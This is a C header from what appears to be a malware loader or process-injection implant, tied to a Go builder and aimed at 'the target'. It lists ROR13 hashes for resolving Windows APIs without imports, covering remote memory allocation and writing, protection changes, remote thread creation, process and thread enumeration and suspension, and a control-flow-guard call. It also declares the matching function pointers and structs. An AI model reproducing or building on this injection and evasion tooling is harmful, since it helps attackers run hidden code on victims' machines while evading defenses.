/* ROR13 hashes and resolved function pointers. The Go builder
 * re-verifies every H_* constant (CheckServiceHeader) before each
 * build; a stale constant fails the build instead of crashing the
 * target. */
#ifndef PALACE_SERVICES_H
#define PALACE_SERVICES_H

#include "loader.h"

#define H_NtAllocateVirtualMemory 0xD33BCABD
#define H_NtWriteVirtualMemory 0xC5108CC2
#define H_NtProtectVirtualMemory 0x8C394D89
#define H_NtCreateThreadEx 0x4D1DEB74
#define H_NtWaitForSingleObject 0xAE06C1B2
#define H_NtFreeVirtualMemory 0xDB63B5AB
#define H_NtOpenProcess 0xF0CA9CA0
#define H_RtlExitUserThread 0xFF7F061A
#define H_VirtualAlloc 0x91AFCA54
#define H_VirtualProtect 0x7946C61B
#define H_VirtualFree 0x030633AC
#define H_LoadLibraryA 0xEC0E4E8E
#define H_LoadLibraryW 0xEC0E4EA4
#define H_GetProcAddress 0x7C0DFCAA
#define H_ExitThread 0x60E0CEEF
#define H_CreateToolhelp32Snapshot 0xE454DFED
#define H_Process32FirstW 0xD53992A4
#define H_Process32NextW 0x2A523C0A
#define H_OpenProcess 0xEFE297C0
#define H_CreateProcessW 0x16B3FE88
#define H_CloseHandle 0x0FFD97FB
#define H_SetProcessValidCallTargets 0x263109F2
#define H_NtSuspendThread 0x488D64DC
#define H_NtResumeThread 0xC54A46C8
#define H_OpenThread 0x58C91E6F
#define H_Thread32First 0xB83BB6EA
#define H_Thread32Next 0x86FED608
#define H_ResumeThread 0x9E4A3F88
#define H_NtDelayExecution 0xD4F11852

typedef NTSTATUS (*NtAllocateVirtualMemory_t)(HANDLE, PVOID *, ULONG_PTR, SIZE_T *, ULONG, ULONG);
typedef NTSTATUS (*NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T *);
typedef NTSTATUS (*NtProtectVirtualMemory_t)(HANDLE, PVOID *, SIZE_T *, ULONG, PULONG);
typedef NTSTATUS (*NtCreateThreadEx_t)(HANDLE *, ULONG, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (*NtWaitForSingleObject_t)(HANDLE, BOOLEAN, LONGLONG *);
typedef NTSTATUS (*NtFreeVirtualMemory_t)(HANDLE, PVOID *, SIZE_T *, ULONG);
typedef NTSTATUS (*NtSuspendThread_t)(HANDLE, PULONG);
typedef NTSTATUS (*NtResumeThread_t)(HANDLE, PULONG);
typedef NTSTATUS (*NtDelayExecution_t)(BOOLEAN, LONGLONG *);
typedef void (*RtlExitUserThread_t)(NTSTATUS);
typedef PVOID (*VirtualAlloc_t)(PVOID, SIZE_T, ULONG, ULONG);
typedef int (*VirtualProtect_t)(PVOID, SIZE_T, ULONG, PULONG);
typedef int (*VirtualFree_t)(PVOID, SIZE_T, ULONG);
typedef HMODULE (*LoadLibraryA_t)(const char *);
typedef void *(*GetProcAddress_t)(HMODULE, const char *);
typedef HANDLE (*CreateToolhelp32Snapshot_t)(ULONG, ULONG);
typedef HANDLE (*OpenProcess_t)(ULONG, int, ULONG);
typedef HANDLE (*OpenThread_t)(ULONG, int, ULONG);
typedef int (*CloseHandle_t)(HANDLE);
typedef ULONG (*ResumeThread_t)(HANDLE);

typedef struct {
    uint32_t dwSize, cntUsage, th32ProcessID, th32DefaultHeapID, th32ModuleID;
    uint32_t th32Threads, th32ParentProcessID;
    int32_t pcPriClassBase;
    uint32_t dwFlags;
    uint16_t szExeFile[260];
} PROCESSENTRY32W;

typedef struct {
    uint32_t dwSize, cntUsage, th32ThreadID, th32OwnerProcessID;
    uint32_t tpBasePri, tpDeltaPri, dwFlags;
} THREADENTRY32;

typedef struct {
    uint32_t cb;
    uint32_t _pad;
    uint16_t *lpReserved, *lpDesktop, *lpTitle;
    uint32_t dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
    uint16_t wShowWindow, cbReserved2;
    uint8_t *lpReserved2;
    void *hStdInput, *hStdOutput, *hStdError;
} STARTUPINFOW;

typedef struct {
    void *hProcess, *hThread;
    uint32_t dwProcessId, dwThreadId;
} PROCESS_INFORMATION;

typedef int (*Process32FirstW_t)(HANDLE, PROCESSENTRY32W *);
typedef int (*Process32NextW_t)(HANDLE, PROCESSENTRY32W *);
typedef int (*Thread32First_t)(HANDLE, THREADENTRY32 *);
typedef int (*Thread32Next_t)(HANDLE, THREADENTRY32 *);
typedef int (*CreateProcessW_t)(const uint16_t *, uint16_t *, void *, void *, int, uint32_t, void *, const uint16_t *, STARTUPINFOW *, PROCESS_INFORMATION *);

extern NtAllocateVirtualMemory_t _NtAllocateVirtualMemory;
extern NtWriteVirtualMemory_t _NtWriteVirtualMemory;
extern NtProtectVirtualMemory_t _NtProtectVirtualMemory;
extern NtCreateThreadEx_t _NtCreateThreadEx;
extern NtWaitForSingleObject_t _NtWaitForSingleObject;
extern NtFreeVirtualMemory_t _NtFreeVirtualMemory;
extern NtSuspendThread_t _NtSuspendThread;
extern NtResumeThread_t _NtResumeThread;
extern NtDelayExecution_t _NtDelayExecution;
extern RtlExitUserThread_t _RtlExitUserThread;
extern VirtualAlloc_t _VirtualAlloc;
extern VirtualProtect_t _VirtualProtect;
extern VirtualFree_t _VirtualFree;
extern LoadLibraryA_t _LoadLibraryA;
extern GetProcAddress_t _GetProcAddress;
extern CreateToolhelp32Snapshot_t _CreateToolhelp32Snapshot;
extern Process32FirstW_t _Process32FirstW;
extern Process32NextW_t _Process32NextW;
extern Thread32First_t _Thread32First;
extern Thread32Next_t _Thread32Next;
extern OpenProcess_t _OpenProcess;
extern OpenThread_t _OpenThread;
extern CreateProcessW_t _CreateProcessW;
extern CloseHandle_t _CloseHandle;
extern ResumeThread_t _ResumeThread;

#endif
